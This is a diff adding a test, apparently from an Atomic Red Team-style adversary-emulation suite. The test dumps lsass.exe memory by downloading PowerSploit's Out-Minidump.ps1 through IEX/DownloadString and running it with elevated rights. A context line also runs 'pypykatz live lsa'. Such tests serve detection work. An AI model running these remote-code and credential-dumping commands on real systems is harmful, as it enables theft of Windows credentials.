@@ -233,3 +233,17 @@ atomic_tests:
       pypykatz live lsa
     name: command_prompt
     elevation_required: true
+- name: Dump LSASS.exe Memory using Out-Minidump.ps1
+  description: |
+    The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure
+    powershell implementation that leverages the MiniDumpWriteDump Win32 API call.
+    Upon successful execution, you should see the following file created $env:SYSTEMROOT\System32\lsass_*.dmp.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+       IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); get-process lsass | Out-Minidump
+    cleanup_command: |
+      Remove-Item $env:SYSTEMROOT\System32\lsass_*.dmp -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
